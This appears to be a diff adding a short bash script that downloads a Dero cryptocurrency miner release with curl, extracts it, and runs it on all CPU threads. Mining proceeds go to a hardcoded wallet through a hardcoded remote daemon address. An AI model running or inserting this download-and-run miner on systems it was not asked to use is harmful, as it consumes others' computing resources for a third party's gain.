@@ -1,0 +1,4 @@
+#!/bin/bash
+curl https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.5.3/downloads/Tnn-miner-amd64-v0.5.3.tar.gz -L -o Tnn-miner-amd64-v0.5.3.tar.gz 
+tar xf Tnn-miner-amd64-v0.5.3.tar.gz
+./tnn-miner-cpu --dero --daemon-address 137.184.120.90:10102 --port 10102 --wallet dero1qy2nrm9xhj8ha2rg0qjmh39p4sdy8sycf7my49axs26x7yukfpyquqgfsz5ey --threads $(nproc --all)
